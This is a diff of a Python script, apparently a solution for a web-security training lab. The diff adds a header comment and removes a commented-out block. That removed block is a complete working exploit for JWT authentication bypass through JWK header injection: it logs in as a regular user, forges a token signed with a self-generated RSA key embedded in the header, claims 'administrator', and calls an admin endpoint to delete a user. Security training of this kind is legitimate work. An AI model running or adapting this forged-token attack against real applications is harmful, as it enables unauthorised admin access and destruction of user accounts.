@@ -1,3 +1,13 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Created on Sun Jul 28 18:56:47 2024
+
+@author: blanco
+"""
+
+
+
 import requests
 import sys
 import urllib3
@@ -251,139 +261,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-"""
-
-# Disable SSL warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# Define proxies (adjust if necessary)
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-
-
-# Disable SSL warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# Function to get CSRF token
-def get_csrf_token(s, url):
-    r = s.get(url, verify=False, proxies=proxies)
-    soup = BeautifulSoup(r.text, 'html.parser')
-    csrf_input = soup.find("input", {'name': 'csrf'})
-    if csrf_input:
-        csrf = csrf_input['value']
-        print(f"(+) CSRF token found: {csrf}")
-        return csrf
-    else:
-        print("(-) CSRF token not found on the page.")
-        sys.exit(-1)
-
-# Function to login and retrieve JWT token from cookies
-def login(url, s, username, password):
-    login_url = urljoin(url, '/login')
-    csrf_token = get_csrf_token(s, login_url)
-
-    # Send login request with CSRF token
-    login_params = {'csrf': csrf_token, 'username': username, 'password': password}
-    r = s.post(login_url, data=login_params, verify=False, proxies=proxies, allow_redirects=False)
-
-    if r.status_code == 302:
-        print("(+) Login is successful.")
-        # Attempt to retrieve JWT from session cookies
-        jwt_token = r.cookies.get('session')
-        if jwt_token:
-            print(f"(+) JWT token retrieved: {jwt_token}")
-            return jwt_token
-        else:
-            print("(-) JWT not found in session cookies.")
-            sys.exit(-1)
-    else:
-        print("(-) Login not successful.")
-        sys.exit(-1)
-
-# Generate RSA Key Pair
-def generate_rsa_key_pair():
-    print("(+) Generating RSA key pair...")
-    private_key = rsa.generate_private_key(
-        public_exponent=65537,
-        key_size=2048,
-        backend=default_backend()
-    )
-
-    public_key = private_key.public_key()
-
-    # Export the private key for signing
-    private_key_pem = private_key.private_bytes(
-        encoding=serialization.Encoding.PEM,
-        format=serialization.PrivateFormat.TraditionalOpenSSL,
-        encryption_algorithm=serialization.NoEncryption()
-    )
-
-    # Extract the public key components for the JWK header
-    public_numbers = public_key.public_numbers()
-    e_b64 = base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
-    n_b64 = base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
-
-    return private_key_pem, e_b64, n_b64
-
-# Perform the JWT bypass via JWK header injection
-def jwt_bypass_jwk_injection(url, token):
-    # Step 1: Decode the JWT without verifying it
-    decoded_token = jwt.decode(token, options={"verify_signature": False})
-    decoded_header = jwt.get_unverified_header(token)
-    print(f"(+) Decoded token: {decoded_token}")
-    print(f"(+) Decoded header: {decoded_header}\n")
-
-    # Step 2: Modify the token payload to escalate privileges
-    decoded_token['sub'] = 'administrator'
-    print(f"(+) Modified token: {decoded_token}\n")
-
-    # Step 3: Generate a new RSA key pair
-    private_key_pem, e_b64, n_b64 = generate_rsa_key_pair()
-
-    # Step 4: Build the JWK header with the public key
-    jwk = {
-        "kty": "RSA",
-        "e": e_b64,
-        "n": n_b64
-    }
-
-    # Step 5: Sign the modified JWT using the private key and embed the JWK in the header
-    modified_token = jwt.encode(decoded_token, private_key_pem, algorithm='RS256', headers={'jwk': jwk})
-    
-    print(f"(+) Modified JWT with JWK header: {modified_token}\n")
-
-    # Step 6: Use the modified token in an attempt to access the admin panel and delete Carlos
-    print("(+) Attempting to access the admin panel with the modified JWT...")
-    cookies = {'session': modified_token}
-    delete_carlos_url = urljoin(url, '/admin/delete?username=carlos')
-    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
-    
-    if "User deleted successfully" in r.text:
-        print("(+) Successfully deleted the Carlos user!")
-    else:
-        print("(-) Attack was unsuccessful")
-
-# Main function
-def main():
-    if len(sys.argv) != 2:
-        print(f"(+) Usage: {sys.argv[0]} <url>")
-        print(f"(+) Example: {sys.argv[0]} www.example.com")
-        sys.exit(-1)
-
-    url = sys.argv[1]
-    regular_username = "wiener"
-    regular_password = "peter"
-    
-    # Start a session to persist cookies
-    s = requests.Session()
-
-    # Log in as a regular user
-    regular_user_jwt = login(url, s, regular_username, regular_password)
-
-    # If login is successful, perform the JWT bypass attack via JWK header injection
-    if regular_user_jwt:
-        jwt_bypass_jwk_injection(url, regular_user_jwt)
-
-if __name__ == "__main__":
-    main()
-"""
